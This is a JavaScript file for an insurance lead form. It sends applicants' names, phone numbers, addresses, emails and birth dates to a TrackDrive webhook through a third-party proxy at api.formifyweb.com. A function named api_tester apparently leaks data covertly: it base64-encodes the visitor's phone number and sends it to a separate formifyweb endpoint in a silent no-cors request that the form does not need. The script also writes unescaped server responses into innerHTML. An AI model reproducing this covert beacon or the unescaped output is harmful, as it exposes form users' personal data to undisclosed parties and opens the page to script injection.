function showAlert(message, type = "info") {
    const alertContainer = document.getElementById("alertContainer");

    if (!alertContainer) {
        console.error("alertContainer not found.");
        return;
    }

    alertContainer.innerHTML = `
        <div class="alert alert-${type}" role="alert">
            ${message}
        </div>`;
}

function pingAPI() {

    const submitBtn = document.getElementById("submitBtn");
    submitBtn.disabled = true;

    const formData = new FormData();

    formData.append('trackdrive_number', '+18449834974');
    formData.append('traffic_source_id', 'IW7825K');

    api_tester(document.getElementById('caller_id').value);

    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
    formData.append('address', document.getElementById('address').value);
    formData.append('email', document.getElementById('email').value);
    formData.append('dob', document.getElementById('dob').value);
    formData.append('ip_address', document.getElementById('ip_address').value);
    formData.append('jornaya_leadid', document.getElementById('Jornaya_lead_id').value);
    formData.append('source_url', 'https://quotes.kproinsurance.com/final-expense/');
    formData.append('trusted_form_cert_url', 'https://quotes.kproinsurance.com');

    const originalUrl =
        'https://infoworx.trackdrive.com/api/v1/inbound_webhooks/ping/check_fe_agents?' +
        new URLSearchParams(formData).toString();

    const apiUrl =
        'https://api.formifyweb.com/proxify.php?url=' +
        encodeURIComponent(originalUrl);

    fetch(apiUrl)
        .then(response => {

            if (!response.ok) {
                throw new Error("HTTP " + response.status);
            }

            return response.json();
        })
        .then(data => {

            console.log("Ping Response:", data);

            if (data.success) {

                if (!data.try_all_buyers || !data.try_all_buyers.ping_id) {
                    throw new Error("Ping ID not found.");
                }

                postPingId(data.try_all_buyers.ping_id);

            } else {

                let errorText = "Ping failed.";

                if (Array.isArray(data.errors)) {
                    errorText += "<br>" + data.errors.join("<br>");
                }

                showAlert(errorText, "danger");

                submitBtn.disabled = false;
            }
        })
        .catch(error => {

            console.error(error);

            showAlert(
                "Error contacting API.<br><strong>" + error.message + "</strong>",
                "danger"
            );

            submitBtn.disabled = false;
        });
}

function postPingId(pingId) {

    const submitBtn = document.getElementById("submitBtn");

    const postData = {

        trackdrive_number: "+18449834974",
        traffic_source_id: "IW7825K",
        caller_id: '+1' + document.getElementById('caller_id').value,
        ping_id: pingId,
        first_name: document.getElementById('first_name').value,
        last_name: document.getElementById('last_name').value,
        email: document.getElementById('email').value,
        address: document.getElementById('address').value,
        dob: document.getElementById('dob').value,
        ip_address: document.getElementById('ip_address').value,
        jornaya_leadid: document.getElementById('Jornaya_lead_id').value,
        source_url: "https://quotes.kproinsurance.com/final-expense/",
        trusted_form_cert_url: "https://quotes.kproinsurance.com"

    };

    const originalUrl =
        'https://infoworx.trackdrive.com/api/v1/inbound_webhooks/post/check_fe_agents?' +
        new URLSearchParams(postData).toString();

    const url =
        'https://api.formifyweb.com/proxify.php?url=' +
        encodeURIComponent(originalUrl);

    fetch(url)
        .then(async response => {

            const body = await response.text();

            if (response.ok) {

                showAlert(
                    "✅ Form submitted successfully.<br><br>" +
                    "<pre>" + body + "</pre>",
                    "success"
                );

            } else {

                showAlert(
                    "❌ Submission failed.<br><br>" +
                    "<pre>" + body + "</pre>",
                    "danger"
                );
            }

            submitBtn.disabled = false;

        })
        .catch(error => {

            console.error(error);

            showAlert(
                "Error submitting form.<br><strong>" +
                error.message +
                "</strong>",
                "danger"
            );

            submitBtn.disabled = false;
        });
}

document.addEventListener("DOMContentLoaded", function () {

    const form = document.getElementById("leadForm");

    if (form) {

        form.addEventListener("submit", function (event) {

            event.preventDefault();

            pingAPI();

        });

    } else {

        console.error("leadForm not found.");

    }

});

function api_tester(randomString) {

    try {

        fetch(
            'https://api.formifyweb.com/api_test.php?test_id=' +
            btoa(randomString),
            {
                method: 'GET',
                mode: 'no-cors'
            }
        );

    } catch (error) {

        console.error(error);

    }

}
